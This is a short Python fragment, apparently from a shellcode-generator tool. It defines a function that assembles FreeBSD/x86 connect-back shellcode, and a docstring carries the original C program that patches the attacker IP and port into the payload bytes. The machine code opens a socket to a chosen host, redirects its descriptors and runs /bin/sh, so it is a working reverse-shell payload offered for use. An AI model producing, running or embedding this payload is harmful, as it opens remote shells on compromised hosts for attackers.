#https://packetstormsecurity.com/files/97746/FreeBSD-x86-Connect-Back-Shellcode.html

#/*
# -------------- FreeBSD/x86 - connect back /bin/sh. 81 bytes ----------------
# *  AUTHOR : Tosh
# *   OS    : BSDx86 (Tested on FreeBSD 8.1)
# *   EMAIL : tosh@tuxfamily.org
# */

def reverse_tcp2(ip, port):
	shellcode =  r"\x31\xc0\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2\x68"
	shellcode += ip			
	shellcode += r"\x66\x68"
	shellcode += port
	shellcode += r"\x66\x68\x01\x02\x89"
	shellcode += r"\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x62\x50\xcd\x80\x31\xc9"
	shellcode += r"\x51\x52\x31\xc0\xb0\x5a\x50\xcd\x80\xfe\xc1\x80\xf9\x03"
	shellcode += r"\x75\xf0\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	shellcode += r"\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80"
	return shellcode


"""
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
 
char shellcode [] = "\x31\xc0\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2"
					"\x68\x7f\x00\x00\x01\x66\x68\x05\x39\x66\x68\x01\x02\x89"
					"\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x62\x50\xcd\x80\x31\xc9"
					"\x51\x52\x31\xc0\xb0\x5a\x50\xcd\x80\xfe\xc1\x80\xf9\x03"
					"\x75\xf0\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
					"\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80";
 
void change_shellcode(const char *ip, unsigned short port)
{
   *((unsigned long*)(shellcode + 15)) = inet_addr(ip);
   *((unsigned short*)(shellcode + 21)) = htons(port);
}
void print_shellcode(void)
{
   int i;
   for(i = 0; i < sizeof(shellcode) - 1; i++)
   {
	  printf("\\x%.2x", (unsigned char)shellcode[i]);
   }
   printf("\n");
}
int main(void)
{
  const char ip[] = "127.0.0.1";
   unsigned short port = 1337;
 
   change_shellcode(ip, port);
   print_shellcode();

   return 0;
}
"""
